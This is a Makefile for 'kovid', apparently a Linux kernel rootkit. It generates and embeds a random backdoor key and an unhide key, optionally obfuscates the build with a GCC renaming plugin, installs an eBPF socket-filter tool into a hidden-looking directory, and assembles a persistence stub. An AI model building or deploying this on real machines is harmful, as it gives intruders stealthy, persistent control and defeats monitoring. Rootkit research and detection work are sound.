OBJNAME=kovid

# turn off ring buffer debug:
# $ DEPLOY=1 make
ifndef DEPLOY
DEBUG_PR := -DDEBUG_RING_BUFFER
endif
STRIP=$(shell which strip)
LD=$(shell which ld)
AS=$(shell which as)
CTAGS=$(shell which ctags)
JOURNALCTL := $(shell which journalctl)
UUIDGEN := $(shell uuidgen)

# For tests, use hardcoded keys.
ifndef TEST_ENV
BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
PRCTIMEOUT := 1200
EBPFHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
else
BDKEY=0x7d3b1cb572f16425
UNHIDEKEY=0x2
PRCTIMEOUT := 120
EBPFHIDEKEY=0x7d3b1cb572f16426
endif

ifndef OBFUSCATE
# PROCNAME, /proc/<name> interface.
COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
	-DJOURNALCTL=\"$(JOURNALCTL)\"
else
CC=gcc-12
COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
	-DJOURNALCTL=\"$(JOURNALCTL)\" \
    -fno-inline \
	-fplugin="/usr/local/lib/libKoviDRenameCodeGCCPlugin.so"
endif

EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}

SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
	src/sock.c src/util.c src/vm.c src/crypto.c src/tty.c

EBPF_C_SRC       := tools/ebpf/socket_filter_bpf.c
EBPF_BPF_OBJ     := tools/ebpf/socket_filter_bpf.o
EBPF_MAIN_SRC    := tools/ebpf/main.c
EBPF_USER_BIN    := tools/ebpf/ebpf-kovid

persist=src/persist

$(OBJNAME)-objs = $(SRC:.c=.o)

obj-m := ${OBJNAME}.o

ifndef OBFUSCATE
CC=gcc
endif

all:
	# TODO: Check if we can generate a random PROCNAME, something like:
	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo "Build complete."
	@echo -n "Backdoor KEY: "
	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
	@echo -n "LKM unhide KEY: "
	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
	@echo -n "Build type: "
ifdef DEPLOY
	@echo "\033[1;37mRELEASE\033[0m"
else
	@echo "\033[1;37mDEBUG\033[0m"
endif
ifdef OBFUSCATE
	@echo "\033[1;37mObfuscated build with gcc-12 compiler\033[0m"
endif

$(EBPF_BPF_OBJ): $(EBPF_C_SRC)
	clang -O2 -g -Wall \
		-I/usr/include/x86_64-linux-gnu/ \
		-target bpf \
		-D__TARGET_ARCH_x86 \
		-c $< \
		-o $@ \
		-I./

$(EBPF_USER_BIN): $(EBPF_MAIN_SRC)
	clang -o $@ $< \
	    -I/usr/include \
	    -L/usr/lib64 -lbpf -lelf -lz

build-ebpf: $(EBPF_BPF_OBJ) $(EBPF_USER_BIN)
	@echo "eBPF artifacts built successfully."
	@echo -n "LKM ebpf KEY: "
	@echo "\033[1;37m$(EBPFHIDEKEY)\033[0m" | sed 's/0x//'
install-ebpf: build-ebpf
	@echo "Installing eBPF artifacts into /usr/bin/$(EBPFHIDEKEY)/ ..."
	@sudo mkdir -p /usr/bin/$(EBPFHIDEKEY)
	@sudo mkdir -p /tmp/$(EBPFHIDEKEY)
	@sudo touch /tmp/$(EBPFHIDEKEY)/ebpf_kovid.json
	@sudo cp $(EBPF_BPF_OBJ) /usr/bin/$(EBPFHIDEKEY)/socket_filter_bpf.o
	@sudo cp $(EBPF_USER_BIN) /usr/bin/$(EBPFHIDEKEY)/ebpf-kovid
	@echo "Installed eBPF artifacts into /usr/bin/$(EBPFHIDEKEY)/"
	@echo "eBPF ebpf_kovid.json will be in /tmp/$(EBPFHIDEKEY)"

persist:
	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
	sed -i "s|.kv.ko|${UUIDGEN}.ko|g" $(persist).S
	$(AS) --64 $(persist).S -statistics -fatal-warnings \
		-size-check=error -o $(persist).o
	$(LD) -Ttext 200000 --oformat binary -o $(persist) $(persist).o

lgtm: persist
	make  -C  /lib/modules/$(shell dpkg --status linux-headers-generic |grep ^Depends| \
		cut -d ":" -f2| sed 's/ linux-headers-//g')/build M=$(PWD) modules

strip:
	$(STRIP) -v -g $(OBJNAME).ko

clang-format:
	clang-format-18 -i src/*.[ch]
	clang-format-18 -i tools/ebpf/*.[ch]

reset-auto:
	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\10x0000000000000000;/" src/sock.c
	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\10x0000000000000000;/" src/kovid.c
	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\10x0000000000000000;/" tools/ebpf/main.c

clean: reset-auto
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -f *.o src/*.o $(persist)
	@echo "Clean."

tags:
	$(CTAGS) -RV src/.

.PHONY: all clean tags
